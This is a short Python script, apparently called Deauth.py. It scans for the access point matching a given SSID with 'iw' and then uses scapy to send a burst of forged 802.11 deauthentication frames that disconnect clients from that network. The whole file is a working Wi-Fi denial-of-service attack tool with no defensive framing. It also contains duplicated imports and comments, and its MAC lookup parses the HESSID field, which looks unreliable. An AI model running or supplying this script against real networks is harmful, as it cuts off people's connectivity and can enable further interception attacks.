import sys
import os
import time
import subprocess
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

# Function to get the MAC address for the SSID using iw
# Function to get the MAC address for the SSID using iw
import subprocess

# Function to get the MAC address for the SSID using iw
import subprocess

# Function to get the MAC address for the SSID using iw
def get_mac_for_ssid(ssid):
    print(f"Scanning for MAC address for SSID: {ssid}...")

    # Using 'iw dev' to get details about the networks in range
    try:
        result = subprocess.run(['iw', 'dev', 'wlp0s20f3', 'scan'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout

        # Searching for SSID and the corresponding MAC address (HESSID)
        lines = output.splitlines()
        target_mac = None
        scanning_ssid = False

        for line in lines:
            if "SSID:" in line and ssid in line:
                scanning_ssid = True  # Start scanning for MAC address after finding SSID

            if scanning_ssid and "HESSID" in line:
                # Extract MAC address from the 'HESSID' line
                target_mac = line.split()[1]  # MAC address is the second item in the HESSID line
                print(f"Found MAC address: {target_mac}")
                break  # Stop scanning once MAC address is found

        if target_mac is None:
            print(f"No MAC address found for SSID: {ssid}. Exiting...")
            return None
        return target_mac
    except Exception as e:
        print(f"Error scanning networks with iw: {e}")
        return None



# Function to deauthenticate a target network
def deauth_target(target_mac, gateway_mac):
    # Create the deauth packet
    packet = RadioTap()/Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)/Dot11Deauth(reason=7)
    sendp(packet, iface="wlp0s20f3", count=100, inter=0.1)  # Send the deauth packets

# Main function
def main():
    if len(sys.argv) != 2:
        print("Usage: python3 Deauth.py <SSID>")
        sys.exit(1)
    
    target_ssid = sys.argv[1]
    print(f"Scanning for MAC address for SSID: {target_ssid}...")

    target_mac = get_mac_for_ssid(target_ssid)
    if target_mac is None:
        print(f"No target found for SSID: {target_ssid}. Exiting...")
        sys.exit(1)

    print(f"Target MAC found: {target_mac}")
    gateway_mac = "00:11:22:33:44:55"  # You can modify this to the gateway MAC if needed
    print("Starting deauthentication...")
    deauth_target(target_mac, gateway_mac)
    print("Deauthentication complete.")

if __name__ == "__main__":
    main()
